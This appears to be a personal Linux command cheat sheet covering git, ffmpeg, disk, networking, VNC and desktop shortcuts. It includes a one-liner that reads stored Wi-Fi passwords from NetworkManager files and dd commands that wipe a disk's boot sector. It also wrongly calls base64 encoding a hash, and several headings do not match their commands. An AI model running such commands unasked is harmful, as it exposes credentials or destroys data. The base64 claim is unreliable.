##==========================================
## iso to USB with dd and show progress status
## Does the same but shows nicely progress in real time with correct Size in %. But also needs the packages sudo,dd,pv and dialog.
$> image="file.iso";drive="/dev/null";sudo -- sh -c 'cat '"${image}"'|(pv -n -s $(stat --printf="%s" '"${image}"')|dd of='"${drive}"' obs=1M oflag=direct) 2>&1| dialog --gauge "Writing Image '"${image}"' to Drive '"${drive}"'" 10 70 7'
##==========================================
## diff. files. Check difference between two file directories recursively
$> diff <(tree /dir/one) <(tree /dir/two)
##==========================================
## web. cert. Download certificate from FTP
$> echo | openssl s_client -servername ftp.domain.com -connect ftp.domain.com:21 -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'
##==========================================
## git. files. git remove files which have been deleted
## It deletes all removed files, updates what was modified, and adds new files.
$> git add -u
##==========================================
## os. user. Set a user password without passwd
## Slightly shorter. It doesnt create a subprocess either.
$> chpasswd <<< "user:newpassword"
## or
$> echo 'user:newpassword' | chpasswd
##==========================================
## git. files. Better tool for exporting git repository is Git itself!
$> git archive HEAD --format=zip > archive.zip
##==========================================
## os. find. find all files that have 20 or more MB on every filesystem, change the size and filesystem to your liking
$> find / -type f -size +20000k -exec ls -lh {} \; 2> /dev/null | awk '{ print $NF ": " $5 }' | sort -nrk 2,2
##==========================================
## List all authors of a particular git project
## List everyone who committed to a particular project, listed alphabetically. To list by commits, add -n to the shortlog. Show Sample Output
$> git shortlog -s | cut -c8-
##==========================================
## files. Listing today’s files only
$> ls -al --time-style=+%D| grep `date +%D`
##==========================================
## git. files. Prints per-line contribution per author for a GIT repository
## Figures out total line contribution per author for an entire GIT repo. Includes binary files, which kind of mess up the true count. If crashes or takes too long, mess with the ls-file option at the start: git ls-files -x "*pdf" -x "*psd" -x "*tif" to remove really random binary files git ls-files "*.py" "*.html" "*.css" to only include specific file types Based off my original SVN version: http://www.commandlinefu.com/commands/view/2787/prints-total-line-count-contribution-per-user-for-an-svn-repository Show Sample Output
$> git ls-files | xargs -n1 -d'\n' -i git-blame {} | perl -n -e '/\s\((.*?)\s[0-9]{4}/ && print "$1\n"' | sort -f | uniq -c -w3 | sort -r
##==========================================
## network. Find passwords that has been stored as plain text in NetworkManager
$> sudo grep -H '^psk=' /etc/NetworkManager/system-connections/*
##==========================================
## files. repo. git. Stage only portions of the changes to a file.
$> git add --patch <filename>
##==========================================
## os. disks. create ext4 filesystem with big count of inodes
## XX is your device partition number like /dev/sdc1 . to see how many inodes your partition have type: df --inodes (or df -i) Default formatting with ext4 would create small inode count for the new partition if you need big count of inodes is the fstype news the correct one. in debian you can see which fstype exists as template in: vim /etc/mke2fs.conf if you format default ext for a partition size with 1TB you would get 1 Million inodes (not enough for backupStorages) but if you format with fstype news you would get hunderd of millions of inodes for the partition. you have tune /etc/sysctl.conf also with following sysconfig parameters fs.file-max = XXX fs.nr_open = XXX where XXX is the count of max inodes for whole system
$> mkfs.ext4 -T news /dev/sdcXX
##==========================================
## Generate a Google maps URL for GPS location data from digital photo
## This command uses the "exiftool" command which is available here: http://www.sno.phy.queensu.ca/~phil/exiftool/ NB, there should be a degree symbol right after the first "%d" NOT a question mark. For some unknown reason, commandlinefu is not able to handle degree symbol correctly ("?")? Show Sample Output
$> echo "https://www.google.com/maps/place/$(exiftool -ee -p '$gpslatitude, $gpslongitude' -c "%d?%d'%.2f"\" image.jpg 2> /dev/null | sed -e "s/ //g")"
##==========================================
## term. Clear terminal Screen
$> tput clear
##==========================================
## files. repo. git. logs. Show git log beautifully
## Only show a short of important information inline ( include branch info ), and color this log tree. Show Sample Output
$> git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr)%Cblue - %cn %Creset' --abbrev-commit --date=relative
##==========================================
## Delete all local git branches that have been merged
## This checks if the branch has been merged with master and then will delete the ones that have been. Keeps your local git repo nice and clean from all the branches. Show Sample Output
$> files. repo. git. git branch --merged | grep -v "\*" | xargs -n 1 git branch -d
##==========================================
## Better git diff, word delimited and colorized
## Define a git alias then git dcolor
$> git config alias.dcolor "diff --color-words"
##==========================================
## files. repo. git. logs. Git Tree Command with color and tag/branch name
$> git log --graph --oneline --all --decorate --color
##==========================================
## files. repo. git. grep across a git repo and open matching files in gedit
$> git grep -l "your grep string" | xargs gedit
##==========================================
## files. repo. git. List all files ever added in git repository
$> git log --name-status --oneline --all | grep -P "^[A|M|D]\s" | awk '{print $2}' | sort | uniq
##==========================================
## files. repo. git. Pushing changes to an empty git repository for the first time
## After cloning an empty repository on the client ("git clone" just after "git init", for instance), "git push" fails. In order to be able to push to this repository for the first time, you need to run the above command. It will link your local "master" branch to the "master" branch in the origin server, and push the changes. This is only necessary only for the first push; after that, you can use just the commands "git push" or "git pull" in order to do this operations. Show Sample Output
$> git push --set-upstream origin master
##==========================================
## files. repo. git. Create html output from colored, word-level git diff
## references: http://stackoverflow.com/questions/8818789/git-diff-word-diff-with-oneline-files use aha to output html: http://stackoverflow.com/a/20861333/199217
$> git diff --word-diff --color-words | aha > index.html && firefox index.html
##==========================================
## multimeddia. video.
$> function copy2mp4() { avconv -i  "$1" -c:v copy -c:a copy "$1".mp4 ; }
## not working
$> function vid2mp4() { avconv -i  "$1" -vf format=yuv420p10le -c:v libx265 -crf 18 -preset medium -x265-params aq-mode=3:cutree=0:psy-rd=4:ipratio=1.2:pbratio=1.1:fades=1 -c:a flac -sample_fmt s16 "$1".mp4 ; }
$> function vid2mp4() { ffmpeg -i  "$1" -c:v libx265 -crf 18 -preset medium -x265-params aq-mode=3:cutree=0:psy-rd=4:ipratio=1.2:pbratio=1.1:fades=1 -c:a flac -sample_fmt s16 "$1".mp4 ; }
$> for %%f IN (*.mkv, *.mp4) do ( ffmpeg -i "%%f" -c:v libx265 -preset fast -x265-params crf=22:bframes=10:ref=6 -pix_fmt yuv420p10le -c:a libopus -b:a 192k "%%~nf_10bx265.mkv" )
##==========================================
## script. code. Define a word from Linux Terminal
## The link gets the definition from vocabulary.com. In case you are behind firewall, use --proxy URL in the curl option. Show Sample Output
$> function define() { curl -s https://www.vocabulary.com/dictionary/$1 | grep 'og:description' | sed 's/&#[0-9][0-9][0-9]//g' | awk -F "\"" '{print $4}' }; define welcome
$> for %%f IN (*.mkv, *.mp4) do ( ffmpeg -i "%%f" -c:v libx265 -preset fast -x265-params crf=22:bframes=10:ref=6 -pix_fmt yuv420p10le -c:a libopus -b:a 192k "%%~nf_10bx265.mkv" )
##==========================================
## os. disks. get a rough estimate about how much disk space is used by all the currently installed debian packages
## The vaule is expressed in megabytes Show Sample Output
$> echo $[ ($(dpkg-query -s $(dpkg --get-selections | grep -oP '^.*(?=\binstall)') | grep -oP '(?<=Installed-Size: )\d+' | tr '\n' '+' | sed 's/+$//')) / 1024 ]
##============================================
## multimeddia. video. Transcode video
$> for %%f IN (*.mkv, *.mp4) do ( ffmpeg -i "%%f" -c:v libx265 -preset fast -x265-params crf=22:bframes=10:ref=6 -pix_fmt yuv420p10le -c:a libopus -b:a 192k "%%~nf_10bx265.mkv" )
$> function vid2mp4() { ffmpeg -i "$1" -c:v libx265 -preset fast -x265-params crf=22:bframes=10:ref=6 -pix_fmt yuv420p10le -c:a libopus -b:a 192k "$1".mp4 ; }
## Transcode video files to mp4 by changing container and reencoding. Long process. Useage: transcode2mp4 *.avi
$> function transcode2mp4() { avconv -i  "$1" -c:v libx264 -c:a mp3 "$1".mp4 ; }
##=========================================
## multimeddia. video. Convert matroska mkv video files to mp4 by changing container without reencoding.
$> function mkv2mp4() { ffmpeg -i "$1" -vcodec copy -acodec copy "$1".mp4 ; }
##==========================================
## os. apps. Get the full description of a randomly selected package from the list of installed packages on a debian system
## I put this command on my ~/.bashrc in order to learn something new about installed packages on my Debian/Ubuntu system each time I open a new terminal Show Sample Output
$> dpkg-query --status $(dpkg --get-selections | awk '{print NR,$1}' | grep -oP "^$( echo $[ ( ${RANDOM} % $(dpkg --get-selections| wc -l) + 1 ) ] ) \K.*")
##==========================================
## multimeddia. video. vid options
$> --input-depth 16 --output-depth 10 --ref 5 --qcomp 0.7 --no-fast-intra --no-cu-lossless --no-tskip-fast --no-pme --no-rd-refine --no-lossless --ctu 32 --max-tu-size 32 --no-strong-intra-smoothing --no-sao --no-sao-non-deblock --no-early-skip --no-rskip
## vid options
$> ffmpeg -i input -filter:v scale=-1:360 output
##==========================================
## networking. If iptables is enabled on the server, the following commands can be used to permit incoming SSH access. They must be run as root.
$> iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
$> iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT
## If you want to save the rules permanently, on some systems that can be done with the command:
$> service iptables save
##==========================================
## Heres a recipe for fixing high iowait when copying large files from USB HDD to internal SSD (Fedora 30, kernel 5.3.6, USB 2.0)
## By default the OS configuration is almost unusable because the large file copying causes a high iowait on the CPU, ranging up to 80%. I wasnt even able to switch between Plasma 5s konsole tabs during the high iowait stage.
## This configuration eliminates the high iowait and the laptop remains fully usable during the file copying process.

/etc/udev/rules.d/98-io-scheduler.rules:
## solution is to add the remote host public key in /etc/ssh/ssh_known_hosts before calling the git module, with the following command:
ssh-keyscan -H remote_host.com >> /etc/ssh/ssh_known_hosts.

ACTION=="add|change", SUBSYSTEM=="block", ENV{DEVTYPE}=="disk", ATTR{queue/scheduler}="bfq", ATTR{queue/nr_requests}="1024", ATTR{queue/iosched/low_latency}="1"

/etc/sysctl.d/98-dirty-bytes.conf:

vm.dirty_background_bytes = 33554432
vm.dirty_bytes = 67108864
vm.dirty_expire_centisecs = 100

/etc/sysctl.d/97-swappiness.conf:

vm.swappiness = 1
## Reboot
## Use "ionice -c 3 command" to start the file copying process. I tried solving the problem for about two weeks until I found the option vm.dirty_expire_centisecs
##==========================================
$> firefox https://www.linuxuprising.com/2019/02/how-to-downgrade-packages-to-specific.html
## Check availible packages including older ones
$> apt policy chromium-browser
##==========================================
## os. disks. file -s can give the UUID for a partition in a case where blkid will not:
$> sudo file -s /dev/sda1
##==========================================
## os. disks. Change the UUID using the tune2fs
$> sudo tune2fs -U c1b9d5a2-f162-11cf-9ece-0020afc76f16 /dev/sdb1
##==========================================
## os. disks. Change the file extension in batch. Useful to create output file names with same input name but distinct extension by including logic inside the loop
$> ll /dev/disk/by-uuid
##==========================================
## os. disks. List the UUID of devices
$> ls -l /dev/disk/by-uuid
##==========================================
## multimedia. video. subs. Hardcode the .srt file
## need the .srt file to be UTF-8 encoded.
$> file some.srt
## Encode mp4 with .srt file
$> ffmpeg -i video.mp4 -vf subtitles=utf8.srt video-with-subs.mp4
##==========================================
## networking. Linux Networking commands and scripts
$> arpwatch                 ## Ethernet Activity Monitor.
$> arp-scan                 ## Discover active devices (hosts) on a local network by sending out requests for IP-to-MAC address mappings.
$> bmon                     ## bandwidth monitor and rate estimator.
$> bwm-ng                   ## live network bandwidth monitor.
$> curl                     ## transferring data with URLs. (or try httpie)
$> darkstat                 ## captures network traffic, usage statistics.
$> dhclient                 ## Dynamic Host Configuration Protocol Client
$> dig                      ## query DNS servers for information.
$> dstat                    ## replacement for vmstat, iostat, mpstat, netstat and ifstat.
$> ethtool                  ## utility for controlling network drivers and hardware.
$> gated                    ## gateway routing daemon.
$> host                     ## DNS lookup utility.
$> hping                    ## TCP/IP packet assembler/analyzer.
$> ibmonitor                ## shows bandwidth and total data transferred.
$> ifstat                   ## report network interfaces bandwidth.
$> iftop                    ## display bandwidth usage.
$> ip (PDF file)            ## a command with more features that ifconfig (net-tools).
$> iperf3                   ## network bandwidth measurement tool. (above screenshot Stacklinux VPS)
$> iproute2                 ## collection of utilities for controlling TCP/IP.
$> iptables                 ## take control of network traffic.
$> IPTraf                   ## An IP Network Monitor.
$> iputils                  ## set of small useful utilities for Linux networking.
$> iw                       ## a new nl80211 based CLI configuration utility for wireless devices.
$> jwhois (whois)           ## client for the whois service.
$> “lsof -i”                ## reveal information about your network sockets.
$> mtr                      ## network diagnostic tool.
$> net-tools                ## utilities include: arp, hostname, ifconfig, netstat, rarp, route, plipconfig, slattach, mii-tool, iptunnel and ipmaddr.
$> ncat                     ## improved re-implementation of the venerable netcat.
$> netcat                   ## networking utility for reading/writing network connections.
$> nethogs                  ## a small ‘net top’ tool.
$> Netperf                  ## Network bandwidth Testing.
$> netsniff-ng              ## Swiss army knife for daily Linux network plumbing.
$> netstat                  ## Print network connections, routing tables, statistics, etc.
$> netwatch                 ## monitoring Network Connections.
$> ngrep                    ## grep applied to the network layer.
$> nload                    ## display network usage.
$> nmap                     ## network discovery and security auditing.
$> nmcli                    ## a command-line tool for controlling NetworkManager and reporting network status.
$> nmtui                    ## provides a text interface to configure networking by controlling NetworkManager.
$> nslookup                 ## query Internet name servers interactively.
$> ping                     ## send icmp echo_request to network hosts.
$> route                    ## show / manipulate the IP routing table.
$> slurm                    ## network load monitor.
$> snort                    ## Network Intrusion Detection and Prevention System.
$> smokeping                ## keeps track of your network latency.
$> socat                    ## establishes two bidirectional byte streams and transfers data between them.
$> speedometer              ## Measure and display the rate of data across a network.
$> speedtest-cli            ## test internet bandwidth using speedtest.net
$> ss                       ## utility to investigate sockets.
$> ssh                      ## secure system administration and file transfers over insecure networks.
$> tcpdump                  ## command-line packet analyzer.
$> tcptrack                 ## Displays information about tcp connections on a network interface.
$> telnet                   ## user interface to the TELNET protocol.
$> tracepath                ## very similar function to traceroute.
$> traceroute               ## print the route packets trace to network host.
$> vnStat                   ## network traffic monitor.
$> websocat                 ## Connection forwarder from/to web sockets to/from usual sockets, in style of socat.
$> wget                     ## retrieving files using HTTP, HTTPS, FTP and FTPS.
$> Wireless Tools for Linux ## includes iwconfig, iwlist, iwspy, iwpriv and ifrename.
$> Wireshark                ## network protocol analyzer.
##==========================================
## file. code. A one-liner version number incrementor
## For a project Im maintaining Ive written a release script, after bodging one too many releases. For this, I came up with this helpful little snippet to increment version numbers.
inc_version() { awk -F. -vOFS=. '{ $ver++; while(ver++<NF) $ver=0; print $0 }' ver=$1 ; }
## You just give it a version number on stdin, tell it which part you need incremented, and youll get it properly changed on stdout. Fields right of the one given get zeroed out.
$> echo "1.2.3" | inc_version 3   ## 1.2.4
$> echo "1.2.3" | inc_version 2   ## 1.3.0
$> echo "1.2.3" | inc_version 1   ## 2.0.0
## If your version number ends on a build- or version control identifier, just replace NF with NF-1, so the zeroing stops one field short.
##==========================================
## rename. files. Batch rename.
$> for file in *.txt; do mv "$file" "${file%.txt}.xml"; done
##==========================================
$> wget -c --recursive --no-clobber --page-requisites --convert-links --restrict-file-names=windows http://website.com
##==========================================
## files. Convert tab separate file (TSV) to JSON with jq
## With this command you can convert a tab separate file (TSV) into a JSON file with jq. For example, this input.tsv i-0b9adca882e5e6326 172.16.0.188 i-088dd69e5c3624888 172.16.0.102 i-0e70eac180537d4aa 172.16.0.85 will produce the showed output. Show Sample Output
$> cat input.tsv | jq --raw-input --slurp 'split("\n") | map(split("\t")) | .[0:-1] | map( { "id": .[0], "ip": .[1] } )'
##------------------------
##==========================================
## os. iso. Write a bootable Linux .iso file directly to a USB-stick
## Writes hybrid ISO directly to USB stick; replace /dev/sdb with USB device in question and the ISO image link with the link of your choice
$> wget -O /dev/sdb https://cdimage.ubuntu.com/daily-live/current/eoan-desktop-amd64.iso
##==========================================
## diff. Check difference between two file directories recursively
$> diff <(tree /dir/one) <(tree /dir/two)
##==========================================
## sync. Rsync using SSH and outputing results to a text file
## --delete will delete copies on remote to match local if deleted on local --stats will output the results -z zip -a archive -A preserve ACL -x dont cross filesystem boundaries -h human readable -e specify the remote shell to use
$> rsync --delete --stats -zaAxh -e ssh /local_directory/ username@IP_of_remote:/Remote_Directory/ > /Text_file_Directory/backuplog.txt
##==========================================
## multimedia. video. Rotate a video file by 90 degrees CW
## Change video orientation in metadata only
$> ffmpeg -i in.mov -c copy -metadata:s:v:0 rotate=90 out.mov
##==========================================
## networking. nmap get all active online ips from specific network
## scan whole specific network for active online ips Show Sample Output
$> nmap -n -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}'
##==========================================
## logs. web. server. Analyse an Apache access log for the most common IP addresses
## This uses awk to grab the IP address from each request and then sorts and summarises the top 10.
$> tail -10000 access_log | awk '{print $1}' | sort | uniq -c | sort -n | tail
##==========================================
## sql. Checks all MySQL tables
## See http://dev.mysql.com/doc/refman/5.0/en/myisamchk.html for further details. You can also repair all tables by running: myisamchk -r *.MYI
$> myisamchk /path/to/mysql/files/*.MYI
##==========================================
## os. logs. info. Display the top ten running processes - sorted by memory usage
## ps returns all running processes which are then sorted by the 4th field in numerical order and the top 10 are sent to STDOUT. Show Sample Output
$> ps aux | sort -nk +4 | tail
##==========================================
## files. repo. git
$> git branch newBranch
## do changes
$> git checkout test
$> git merge newBranch
$> git push
$> git checkout master
$> git merge newBranch
$> git push
$> git reset .
$> git status
$> git checkout .
$> git checkout master
$> git clean -fdx
$> git pull
$> git remote prune origin
$> git branch
$> git log
##==========================================
## General, you can always do:
$> <command> | ssh user@remote-server "cat > output.txt"
## It saves output of <command> to output.txt file in remote server.
## In your case, on Server-1:
$> echo "qwerty" | ssh user@Server-2 "cat > output.txt"
## If two servers have no connectivity, but you can ssh to both servers, then from local machine, you can do:
$> ssh user@Server-1 "<command>" | ssh user@Server-2 "cat > output.txt"
$> for ip in {192.168.1.123,192.168.1.124,192.168.1.125,192.168.1.127,192.168.1.128}; do
$>     echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHgEteaGIZtKPo/vKfc4NSuYU2/9+AwRDA1uWWYR9BNCNL8SBHdEzBDXMbUw9wsF0JRimclU1+fke6d7h5R8hJJQyl5sdKk8pDjjZbvcWahnI03nPjNupr03WrHBUzclNAyQjSeZTz7yK7UorV9oCLOLZEJ+S82bJsypqaA2xZdApSUFRxCUShqp4rTpW51xKi7nG4dIHT5l0YRVtZ4aztuMbIPy/GtkFZEgTgYcsK4uJZcNKI9Ne0AMFOcQTDzf3IatWdDY6O8i1z66uuOOHtt9mdv1o1zTHupHbu4r8qOm9PMPzyUOrwb980WTDECxxpbK5v+Xls+4CPlxTanHWr  \
$>     | ssh -p 101 $ip 'cat >> .ssh/authorized_keys'
$>     ssh -p 101 $ip 'tail .ssh/authorized_keys'
$> done
##==========================================
## encode images to webm
$> mkdir out
$> for f in *.{png,jpg,jpeg}; do ffmpeg -loop 1 -i "$f" -g 1 -c:v libvpx -deadline best -cpu-used 0 -qmin 22 -crf 22 -qmax 22 -t 1 -r 1 "out/${f%.*}.webm"; done
$> for %%f IN (*.png, *.jpg, *.jpeg) do (
$> ffmpeg -loop 1 -i "%%f" -g 1 -c:v libvpx -deadline best -cpu-used 0 -qmin 22 -crf 22 -qmax 22 -t 1 -r 1 "%%~nf.webm"
## If you want to encode transparent images the only thing that worked for me is deleting
$> -qmin 22
## and replacing it with
$> -auto-alt-ref 0
##==========================================
## Make multiple directories all at once
$> mkdir -p roles/pipeline/{tasks,handlers,files,defaults,templates}
##==========================================
## Turn on and off caplock LED
$> sudo su -c 'setleds -L +caps < /dev/tty7'
$> sudo su -c 'setleds -L -caps < /dev/tty7'
##==========================================
## find the index of in ansible.txt
hostname: |
  {% for item in standard_network_info['hosts'] %}
  item['loopback'] when item['name'] == ansible_hostname
  {% endfor %}
##==========================================
## Set duration of screencasts manually, by modifying the following gsettings: 300 for 5 minutes, 600 for 10 minute
$> gsettings set org.gnome.settings-daemon.plugins.media-keys max-screencast-length 600
## Start and stop
$> Ctrl + Alt + Shift + R
##==========================================
## Copy archival mode, preserves permissions, owner, etc
$> cp -a
##==========================================
## #######################################################
## ##    Chromecast
## #######################################################
## Control chromecast with cli  Awesome!
## https://www.linuxuprising.com/2018/05/command-line-chromecast-player-catt.html
##-------------------------------
## Chromecast from cli
$> sudo apt install python3-pip python3-setuptools
$> pip3 install --user catt
## usage
$> catt --help
## usage: catt [OPTIONS] COMMAND [ARGS]...
## Options:
$> catt --delete-cache           ## Empty the Chromecast discovery cache.
$> catt -d, --device NAME_OR_IP  ## Select Chromecast device.
$> catt --version                ## Show the version and exit.
$> catt -h, --help               ## Show this message and exit.
## Commands:
$> catt add           ## Add a video to the queue (YouTube only).
$> catt cast          ## Send a video to a Chromecast for playing.
$> catt cast_site     ## Cast any website to a Chromecast.
$> catt clear         ## Clear the queue (YouTube only).
$> catt ffwd          ## Fastforward a video by TIME duration.
$> catt info          ## Show complete information about the currently-playing video.
$> catt pause         ## Pause a video.
$> catt play          ## Resume a video after it has been paused.
$> catt remove        ## Remove a video from the queue (YouTube only).
$> catt restore       ## Return Chromecast to saved state.
$> catt rewind        ## Rewind a video by TIME duration.
$> catt save          ## Save the current state of the Chromecast for later use.
$> catt scan          ## Scan the local network and show all Chromecasts and their IPs.
$> catt seek          ## Seek the video to TIME position.
$> catt skip          ## Skip to end of content.
$> catt status        ## Show some information about the currently-playing video.
$> catt stop          ## Stop playing.
$> catt volume        ## Set the volume to LVL [0-100].
$> catt volumedown    ## Turn down volume by a DELTA increment.
$> catt volumeup      ## Turn up volume by a DELTA increment.
$> catt write_config  ## Write the name of default Chromecast device to config file.
##==========================================
## #######################################################
## ##    Keyboard shortcuts
## #######################################################
## OS.
## 1. General
$> Win                          ## Open the Applications Menu
$> Win+D                        ## Show desktop
$> Win+E                        ## Open File Manager
$> Alt+F2                       ## Open the run dialog
$> Ctrl+Alt+T                   ## Open a terminal
$> Shift+F10 OR right click     ## Open the context menu of the selected item
$> Ctrl+Z/Ctrl+Y                ## Undo / redo
$> Ctrl+X                       ## Cut selected item
$> Ctrl+C                       ## Copy selected item
$> Ctrl+V                       ## Paste
## 3. Manage Windows and Workspaces
$> Alt+Tab                      ## Cycle through open windows on current Workspace
$> Alt+`                      ` ## Cycle through open windows of the same application on ANY Workspace
$> Ctrl+Alt+ ↓ /Alt+Esc         ## Toggle Scale view (display all windows on current Workspace)
$> Ctrl+Alt+ ↑                  ## Toggle Expo view (display all Workspaces)
$> Ctrl+Alt+ ←/→                ## Move to left / right workspace
$> Ctrl+Alt+Shift+ ←/→          ## Move current window to left /right workspace
$> Win+Shift+ ← ↑ → ↓           ## Move current window to different monitor (left/right/up/down)
## 4. Current Application Window
$> Alt+F4                       ## Close window
$> Alt+F5                       ## Unmaximize window
$> Alt+F7                       ## Resize window
$> Alt+F8                       ## Move window
$> Alt+F10                      ## Toggle maximize / unaximize window
$> Win+ ← ↑ → ↓                 ## Snap window to left/right/top/bottom half of screen. Use in combination to snap to corners, e.g. right then $> up. Key back toward the middle of the screen to unsnap (e.g., for a right-snapped window, push super+arrow left)
$> Ctrl+Win+ ← ↑ → ↓            ## Tile window to the left/right/top/bottom half of the screen. Other maximized windows will fill $> in the remaining space.
$> Alt+Space                    ## Open window menu
## 5. Session
$> Ctrl+Alt+L                   ## Lock screen
$> Ctrl+Alt+Delete              ## Log out
$> Ctrl+Alt+End                 ## Open the Shut Down menu (Suspend / Restart / Shut Down)
## 6. Screenshots and Screen Recording
## By default, screenshots are saved to the Pictures folder in your Home directory
$> Print Screen                 ## Take a screenshot
$> shift+Print Screen           ## Take a screenshot of area
$> Print Screen                 ## Take a screenshot
$> Ctrl+Print Screen            ## Copy a screenshot to the clipboard
$> Alt+Print Screen             ## Take a screenshot of the current window
$> Ctrl+Alt+Print Screen        ## Copy a screenshot of the current window to the clipboard
$> Ctrl+Alt+Shift+R             ## Toggle desktop recording (video will be saved to your Home folder)
## 7. Troubleshooting
$> F1                           ## Launch Linux Mint online help
$> Ctrl+Alt+Esc                 ## Restart Cinnamon, preserving all applications and windows (version 2.6+)
$> Win+P                        ## Re-detect display devices
$> Win+L                        ## Toggle looking glass debugging tool
$> Ctrl+Alt+Backspace           ## Restart the X server (WARNING: this will close all running applications!)
## 8. Accessibility
$> Alt+Win+=/- or Alt+Mousewheel        ## Zoom desktop in or out (Note: Zoom must be enabled in Universal Access settings)
##==========================================
$> https://linoxide.com/linux-how-to/command-parallel-pdsh-example/
## The pdsh parallel shell tool lets you run a command across multiple nodes in a cluster. pdsh is a variant of the rsh(1) command. Unlike rsh(1), which runs commands on a single remote host, pdsh can run multiple remote commands in parallel. pdsh uses a "sliding window" (or fanout) of threads to conserve resources on the initiating host while allowing some connections to time out.
## Make ssh the default protocol by putting this in .bashrc
$> echo "export PDSH_RCMD_TYPE=ssh" >> .bashrc
## Run command aon a list of servers
$> pdsh -w ops@srv000[0-2].s0004.sfo.stcg.url.ai 'date +%s'
## Or from a nested command
$> pdsh -w $(echo $(seq -f 'ops@srv%04g.s0003.sfo.stcg.url.ai' 0 7) | tr ' ' ,) 'date +%s'
## General form
$> pdsh -R ssh -w $USER@machine[0-5].url.com "<command>"
##==========================================
## Re: Mint 19 Upgrade - Vino gone?
## You can install Vino on LM19, I did it, but the vino-server command to start the server wouldnt work - just told me the command didn't exist? Also couldn't figure out what file I had to edit or what to do in the command line to set up the settings the way I wanted them either...
$> sudo apt-get install vino
## Use dconf-editor to manage the settings
## Under dconf-editor the schema you need to navigate to is org.gnome.desktop.remote-access
$> apt install dconf-editor
## Alternative you can use gsettings set in the command line
## With gsettings the schema is accessed via org.gnome.Vino
## For the list of keys...
## CODE: SELECT ALL
$> gsettings list-recursively org.gnome.Vino
$@    org.gnome.Vino notify-on-connect true
$@    org.gnome.Vino alternative-port uint16 5900
$@    org.gnome.Vino disable-background false
$@    org.gnome.Vino use-alternative-port false
$@    org.gnome.Vino icon-visibility 'always'
$@    org.gnome.Vino use-upnp false
$@    org.gnome.Vino view-only false
$@    org.gnome.Vino prompt-enabled false
$@    org.gnome.Vino disable-xdamage true
$@    org.gnome.Vino authentication-methods ['vnc']
$@    org.gnome.Vino network-interface ''
$@    org.gnome.Vino require-encryption false
$@    org.gnome.Vino mailto ''
$@    org.gnome.Vino lock-screen-on-disconnect false
$@    org.gnome.Vino vnc-password 'cGE1NXcwcmQ='
## The password key is not stored in plain text its hashed. To generate the hash from the plaintext password 'pa55w0rd' (do use something more secure!)
## CODE: SELECT ALL
$> echo -n 'pa55w0rd' | base64 cGE1NXcwcmQ=
## To start the server
$> /usr/lib/vino/vino-server --sm-disable
## If you have UFW enabled ensure there is an appropriate rule to allow access in on port 5900.
## Connect from the client.
## This is me connecting from my phone (with the settings as listed above).
##==========================================
## Install phabricator howto
$> https://www.youtube.com/watch?v=yX3us669EvY
##==========================================
## GUI. VNC. Install x11vnc:
$> sudo apt-get -y install x11vnc
## Create the directory for the password file:
$> sudo mkdir /etc/x11vnc
## Create the encrypted password file:
$> sudo x11vnc --storepasswd /etc/x11vnc/vncpwd
## You will be asked to enter and verify the password. Then press Y to save the password file.
## Create the systemd service file for the x11vnc service:
$> sudo nano /lib/systemd/system/x11vnc.service
## Copy/Paste this code into the empty file:
$#    [Unit]
$#    Description=Start x11vnc at startup.
$#    After=multi-user.target
$#
$#    [Service]
$#    Type=simple
$#    ExecStart=/usr/bin/x11vnc -auth guess -forever -noxdamage -repeat -rfbauth /etc/x11vnc/vncpwd -rfbport 5900 -shared
$#
$#    [Install]
$#    WantedBy=multi-user.target
$#
## Reload the services:
$> sudo systemctl daemon-reload
## Enable the x11vnc service at boot time:
$> sudo systemctl enable x11vnc.service
## Start the service:
## Either reboot or
$> sudo systemctl start x11vnc.service
##==========================================
## Boot code will be zerod but the partition table remains intact :
$> dd if=/dev/zero of=/dev/sdb bs=446 count=1
## Zero everything including the partition table record.
$> dd if=/dev/zero of=/dev/sdb bs=512 count=1
##==========================================
## Batch change file names. Like sed for files.
$> prename 's/THIS/THAT/g' *.pdf
##==========================================
$> sudo apt-get install htop
$> sudo apt-get install linux-tools-generic
##==========================================
## Install phabricator howto
$> firefox https://www.youtube.com/watch?v=yX3us669EvY
##==========================================
## How to get into github
$> firefox https://superuser.com/questions/199507/how-do-i-ensure-git-doesnt-ask-me-for-my-github-username-and-password
##==========================================
## Print file hightlighted with search terms.
$> grep -e "^" -e "SEARCHTERM" FILE.txt
##==========================================
## Color for manpages in less makes manpages a little easier to read:
$> export LESS_TERMCAP_mb=$'\E[01;31m'
$> export LESS_TERMCAP_md=$'\E[01;31m'
$> export LESS_TERMCAP_me=$'\E[0m'
$> export LESS_TERMCAP_se=$'\E[0m'
$> export LESS_TERMCAP_so=$'\E[01;44;33m'
$> export LESS_TERMCAP_ue=$'\E[0m'
$> export LESS_TERMCAP_us=$'\E[01;32m'
##==========================================
## Size totals of all dir in current dir
$> du -sh ./*
##==========================================
## Hardened Firefox config or use the relaxed branch
$> firefox https://github.com/pyllyukko/user.js
$> cp ./user.js ~/.mozilla/firefox/XXXXXXXX.your_profile_name/user.js
##==========================================
## Prints directory structure like tree command
$> find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
##==========================================
## Quick info on commands. ## Usage: cheat <command>, exp: cheat ls
$> curl cheat.sh/<command>
## Add to .bashrc
$> echo 'function cheat() { curl cheat.sh\/"$1"; }' >> ~/.bashrc
##==========================================
# Launch a specific X application over SSH on local computer from remote.
$> ssh -X -t user@example.com 'chromium-browser'
##==========================================
## Terminal image viewer
$> firefox https://github.com/eddieantonio/imgcat
## Clone
$> git clone https://github.com/eddieantonio/imgcat.git
## Make sure software building installed
$> sudo apt-get install autoconf libncurses-dev build-essential gcc linux-tools-generic
## Build the imgcat software
$> autoconf
$> ./configure
$> make
## Put it in /usr/local/bin
$> sudo make install
#@    install -d /usr/local/bin /usr/local/share/man/man1
#@    install -s imgcat /usr/local/bin
#@    install -m 644 docs/imgcat.1 /usr/local/share/man/man1
## Try it out, super cool
$> imgcat face.png
$> imgcat -H face.png
##==========================================
## Parse json
$> https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/
##==========================================
## #############################################
## ##    zsh
## #############################################
## Install zsh
